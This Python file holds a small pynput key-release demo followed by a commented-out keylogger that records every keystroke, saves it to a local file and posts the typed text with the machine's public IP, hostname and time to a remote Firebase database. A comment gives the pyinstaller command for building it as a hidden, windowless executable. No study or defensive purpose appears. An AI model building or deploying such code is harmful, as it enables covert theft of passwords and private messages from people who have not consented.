from pynput import keyboard



def on_release(key):
    print('{0} released'.format(
        key))
    if key.char == 'e':
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_release=on_release) as listener:
    listener.join()


'''
# https://github.com/boppreh/keyboard#example
# pyinstaller --onefile -w .\pyLogger.py

import keyboard
import requests
import socket
from datetime import datetime

sourceDb ='https://datacovidcaldas.firebaseio.com/keylogger.json'
buffer = ""

def send(string):
    info = {
        'ip':requests.get('https://api.ipify.org').text,
        'host':socket.gethostname(),
        'fecha':datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        'texto':string
        }
    if(requests.post(sourceDb,json = info).status_code == 200):
        print('ok')

def file(string):
	fw = open("reporte.txt","a",encoding="utf-8")
	fw.write(string+"\n")
	fw.close()

def scan(e):
    global buffer
    #print(e.name)
    tecla = e.name
    if(tecla == "enter"):
        file(buffer)
        send(buffer)
        buffer = ""
    else:
        if(len(tecla) == 1):
            buffer += tecla
        elif(tecla == 'space'):
            buffer += ' '
        elif(tecla == 'backspace'):
            buffer = buffer[0:-1]
        print(buffer)

keyboard.on_press(scan,suppress=False)
keyboard.wait()


'''